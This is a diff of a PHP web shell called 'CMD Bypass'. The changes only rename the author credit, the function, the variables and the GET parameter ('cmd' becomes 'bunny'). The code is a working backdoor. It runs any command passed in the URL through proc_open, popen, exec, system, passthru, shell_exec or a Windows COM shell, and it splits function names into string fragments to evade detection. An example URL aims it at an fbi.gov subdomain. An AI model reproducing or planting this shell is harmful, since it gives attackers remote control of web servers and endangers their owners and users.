@@ -1,7 +1,7 @@
-CMD Bypass by ./YouthBoys Lamerscode
-<!-- example: https://youthboys-lamerscode.fbi.gov/file.php?cmd=uname -a -->
+CMD Bypass by ./Bunny404 InvisibleCode
+<!-- example: https://Bunny404.fbi.gov/file.php?bunny=uname -a -->
 <?php
-function Z4pCmd($anunya) {
+function BunnyCmd($bunnytime) {
     $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
     $fw = 'f'.'wr'.'it'.'e';
     $fc = 'f'.'cl'.'os'.'e';
@@ -22,8 +22,8 @@ function Z4pCmd($anunya) {
     $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
     $preg = 'pr'.'eg_'.'mat'.'ch';
     $regex = '2'.'>'.'&'.'1';
-    if ( !$preg( '/'.$regex.'/i', $anunya ) ) {
-        $anunya = $anunya.' '.$regex;
+    if ( !$preg( '/'.$regex.'/i', $bunnytime ) ) {
+        $bunnytime = $bunnytime.' '.$regex;
     }
 
     if ( $func_exist( $proc ) ) {
@@ -32,7 +32,7 @@ function Z4pCmd($anunya) {
             1 => [ 'pipe', 'w' ],
             2 => [ 'pipe', 'w' ],
         ];
-        $process = $proc( $anunya, $descriptors, $pipes);
+        $process = $proc( $bunnytime, $descriptors, $pipes);
         if ( $is_rsrc( $process ) ) {
             $fw( $pipes[ 0 ], 'input_data_here' );
             $fc( $pipes[ 0 ] );
@@ -44,12 +44,12 @@ function Z4pCmd($anunya) {
             return trim($hayoloh(stripslashes($output)));
         }
     } elseif ( $func_exist( $pop ) ) {
-        $process = $pop( $anunya, 'r' );
+        $process = $pop( $bunnytime, 'r' );
         $read = $fr( $process, 2096 );
         return trim($hayoloh(stripslashes(print_r( "$process: ".gettype( $process )."\n$read \n" ))));
         $pop_cls( $process );
     } elseif ( $func_exist( $exc ) ) {
-        $exc( $anunya, $output, $returnCode );
+        $exc( $bunnytime, $output, $returnCode );
         if ( $returnCode === 0 ) {
             $res = implode( $output );
             return trim($hayoloh(stripslashes($res)));
@@ -57,17 +57,17 @@ function Z4pCmd($anunya) {
             flush();
         }
     } elseif ( $func_exist( $sys ) ) {
-        $out = $sys( $anunya );
+        $out = $sys( $bunnytime );
         return trim($hayoloh(stripslashes($out)));
     } elseif ( $func_exist( $pass ) ) {
-        $out = $pass( $anunya );
+        $out = $pass( $bunnytime );
         return trim($hayoloh(stripslashes($out)));
     } elseif ( $func_exist( $sh_exc ) ) {
-        $out = $sh_exc( $anunya );
+        $out = $sh_exc( $bunnytime );
         return trim($hayoloh(stripslashes($out)));
     } elseif ( $func_exist( $com ) ) {
         $shell = new $com($wscsh);
-        $kom_mand = "$cMdexe /c ".$anunya;
+        $kom_mand = "$cMdexe /c ".$bunnytime;
         $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
         return trim($hayoloh(stripslashes($output)));
     }else {
@@ -75,10 +75,10 @@ function Z4pCmd($anunya) {
     }
 }
 
-if (isset($_GET['cmd'])) {
-    $anunya = $_GET['cmd'];
+if (isset($_GET['bunny'])) {
+    $bunnytime = $_GET['bunny'];
     echo '<center><textarea rows="50" cols="80">';
-    echo Z4pCmd($anunya);
+    echo BunnyCmd($bunnytime);
     echo '</textarea></center>';
 }
 ?>
